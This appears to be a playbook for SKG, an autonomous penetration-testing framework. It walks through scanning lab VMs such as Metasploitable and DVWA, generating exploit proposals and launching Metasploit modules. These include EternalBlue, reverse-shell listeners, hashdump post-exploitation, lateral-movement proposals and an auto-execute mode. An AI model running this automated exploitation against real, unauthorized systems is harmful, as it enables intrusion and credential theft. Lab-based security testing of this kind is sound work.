# SKG Full Engagement Playbook

This document walks through a complete autonomous engagement from zero to exploit proposal using a standard lab setup. The same field dynamics apply at any scale — only the target catalog changes.

---

## Prerequisites

**Lab target**: Any intentionally vulnerable VM works. Tested configurations:
- Metasploitable 2 (Linux, SSH, web, SMB, FTP — easiest starting point)
- Metasploitable 3 Win2k8 (Windows SMB — EternalBlue demo)
- DVWA running on any host

**SKG host**: Linux system with SKG installed (`./setup_arch.sh` or `pip install -e .`).

**Optional**:
- Metasploit Framework (for exploit proposals): `msfconsole` in PATH
- Ollama (for forge/catalog generation): `ollama serve` running
- nmap ≥ 7.x with NSE scripts

Check what is available:
```bash
skg check   # startup validation — prints what is and isn't available
```

---

## Stage 1: Declare the target

Edit `/etc/skg/targets.yaml` (or `./targets.yaml` for local runs):

```yaml
targets:
  - host: 192.168.1.100      # your VM's IP
    method: ssh
    user: msfadmin
    password: msfadmin       # or: key: ~/.ssh/id_rsa
    workload_id: metasploitable2
    enabled: true
    domains: [host, web]
    tags: [linux, ssh, metasploitable]
```

Start the daemon:
```bash
skg start
```

---

## Stage 2: Discovery — populate the field

SKG needs an attack surface to operate on. Discovery does a TCP port scan and classifies each target by domain (host, web, SMB, etc.).

```bash
# Discover a single host
skg target add 192.168.1.100

# Or discover a subnet (slower but finds everything)
skg target add-subnet 192.168.1.0/24
```

After discovery, check the entropy landscape:
```bash
skg status
```

Expected output — before any observation, every target has high entropy (all wickets unknown):
```
  Target                  E      Unknowns  Folds  Domains
  192.168.1.100          18.0    18        0      host,web
```

---

## Stage 3: First gravity cycle

The gravity field selects which target has the highest entropy and which instrument has the greatest entropy-reduction potential. It then dispatches that instrument.

```bash
skg gravity --cycles 1
```

What happens:
1. FoldDetector scans for structural gaps (missing toolchain coverage)
2. Entropy landscape computed across all targets
3. Highest-entropy target selected: 192.168.1.100 (E=18.0)
4. Best instrument selected: `nmap` (widest observational reach)
5. nmap runs: `-sV --script default,vuln -p-`
6. Events written to `/var/lib/skg/events/`
7. Projector collapses events → tri-state wicket graph
8. Field energy drops as unknowns resolve

After cycle 1:
```bash
skg status    # entropy drops from 18.0 → ~6.0
skg surface   # full wicket state (realized/blocked/unknown per domain)
```

---

## Stage 4: SSH collection (deeper observation)

nmap gives network-layer evidence. SSH collection gives system-level evidence (privilege state, running processes, SUID binaries, credential files).

```bash
skg observe 192.168.1.100 --with ssh
```

SKG uses the credentials from `targets.yaml` automatically. You'll see wickets like:
- `HO-05`: root shell confirmed (if SSH user is root)
- `HO-08`: world-writable cron job found
- `HO-10`: SUID binary present
- `HO-13`: SSH private keys in `~/.ssh`

---

## Stage 5: Web surface (if target runs HTTP)

```bash
skg observe 192.168.1.100 --with web
```

For authenticated web scan (DVWA, WordPress, etc.):
```bash
skg observe 192.168.1.100 --with web --auth
```

Web wickets realized:
- `WB-01`: HTTP service confirmed
- `WB-05`: Default credentials accepted
- `WB-09`: SQLi parameter found
- `WB-10`: Command injection confirmed
- `WB-11`: XSS payload executed

---

## Stage 6: Check the proposals queue

After the gravity cycle resolves enough wickets, the exploit dispatcher fires automatically. When all required wickets for an attack path are realized, an exploit proposal is generated.

```bash
skg proposals list
```

Example output:
```
ID          Domain  Path                         Confidence  Status
3af7b21e    host    host_linux_privesc_sudo_v1   0.91        pending
8c2d4f19    web     web_cmdi_to_reverse_shell    0.94        pending
```

Review a proposal:
```bash
skg proposals show 3af7b21e
```

Shows: the attack path, all realized/blocked/unknown wickets, the MSF module, options, and a confidence score with evidence chain.

---

## Stage 7: Trigger an exploit proposal

**Review first**. SKG never auto-executes. This is correct: observation is autonomous, action is operator-gated.

```bash
skg proposals trigger 3af7b21e
```

This:
1. Writes an MSF RC script to `/var/lib/skg/proposals/`
2. Launches `msfconsole -q -r <rc_file>`
3. Captures output, parses session detection
4. If session opens: runs post-exploitation modules automatically (local_exploit_suggester, hashdump, enum_sudo, network enumeration)
5. Writes post-exploitation wicket events back to the field
6. Field updates: new high-confidence observations collapse more wickets

For listener-style proposals (reverse shells):
```bash
skg proposals trigger 8c2d4f19
# SKG starts the listener, prints the payload injection URL/command
# Deliver the payload manually, then:
skg proposals trigger 8c2d4f19 --await-session
```

---

## Stage 8: Read the updated field

After exploitation:
```bash
skg status        # entropy should be very low for this target
skg surface       # show full field including post-exploitation wickets
skg proposals list  # new proposals may have been generated (lateral movement)
```

The field reflects what the system knows: privilege state, credential files, network position. New folds may appear for adjacent targets (lateral movement surface).

---

## Running multiple cycles autonomously

```bash
skg gravity --cycles 5 --authorized
```

`--authorized` enables auto-execution of pre-approved proposal types. Without it, proposals are generated but not triggered. With it, exploit proposals that reach confidence ≥ 0.90 on fully-realized attack paths are triggered after a 30-second operator window.

---

## Observing the field during a run

The operator UI runs at `http://localhost:5055/ui` (daemon must be running):
- **Gravity panel**: start/stop/run cycles, live cycle output
- **Targets + Folds**: entropy landscape, structural gaps, sorted by information pressure
- **Workspace**: full surface view, proposal queue, pearl manifold (observation memory curvature)
- **Approvals**: accept/defer/reject proposals; field_action proposals display the RC command on accept
- **Assistant**: ask questions about any wicket, path, or fold (Ollama/Claude-backed)

---

## EternalBlue (MS17-010) demonstration

The empirically validated path from Paper 4 §7:

```bash
# Target: Metasploitable 3 Win2k8 (or any unpatched Win2k3/Vista/7/2008)
# Edit targets.yaml: add the Windows target with method: winrm or method: smb

skg target add 192.168.1.50

# Single gravity cycle with nmap NSE:
skg gravity --cycles 1
# Gravity selects nmap, runs --script smb-vuln-ms17-010
# HO-01 (reachable), HO-19 (SMB port 445), HO-25 (confirmed VULNERABLE) all realized

skg proposals list
# → host_network_exploit_v1 proposal at confidence 0.95

skg proposals show <id>
# Shows: requires [HO-01, HO-19, HO-25] — all realized
# Module: exploit/windows/smb/ms17_010_eternalblue
# Confidence: 0.95

skg proposals trigger <id>
# Launches msfconsole with LHOST/LPORT/PAYLOAD configured
# On success: SYSTEM session opens, post-exploitation runs
```

The coupling chain that drives instrument selection:
```
HO-01 (host reachable, K=0.80) →
HO-19 (SMB exposed on 445, K=0.90) →
HO-25 (NSE confirms VULNERABLE, K=0.90) →
host_network_exploit_v1 → proposal at 0.95 confidence
```

The gravity field selected nmap with NSE (`--script smb-vuln-ms17-010`) because the SMB domain had the highest coupling weight (K_smb_vuln=0.90) and nmap with NSE is the only instrument with a wavelength covering HO-25. This is coupling-driven instrument selection, not a scripted decision tree.

---

## Reviewing the field state

```bash
skg field metasploitable2 host    # raw field state for this workload
skg folds                         # structural gaps (fold detector output)
skg web                           # gravity web: bonds + coupling graph
```

---

## Replay without a live target

Pre-recorded events from the EternalBlue validation run are in `artifacts/cycle_evidence/`.

```bash
skg replay artifacts/cycle_evidence/
```

This loads the NDJSON events, projects them through the kernel, and shows the resulting field state — no live connection required. The entropy landscape, realized wickets, and proposals match the live run exactly because the substrate is event-sourced.

---

## Troubleshooting

**No proposals after gravity cycles**:
- `skg surface` — check which wickets are still unknown
- `skg folds` — check for structural gaps (missing toolchain domains)
- The attack path may require wickets that the current adapters cannot observe

**SSH collection fails**:
- Verify credentials in `targets.yaml`
- Test manually: `ssh user@host` — if it works, SKG will work
- Check: `skg observe <ip> --with ssh` shows the actual error

**nmap not found**:
- Discovery works without nmap (socket-based scan)
- NSE scripts (for HO-25 MS17-010) require nmap: `pacman -S nmap` or `apt install nmap`

**Proposals not triggering**:
- `msfconsole` must be in PATH: `which msfconsole`
- Check: `skg proposals show <id>` — is the RC file path populated?

**LLM/forge not generating catalogs**:
- Ollama: `ollama serve` in background, `ollama pull llama3.2:3b`
- Or: `export ANTHROPIC_API_KEY=sk-...`
- `skg resonance status` shows which backend is active
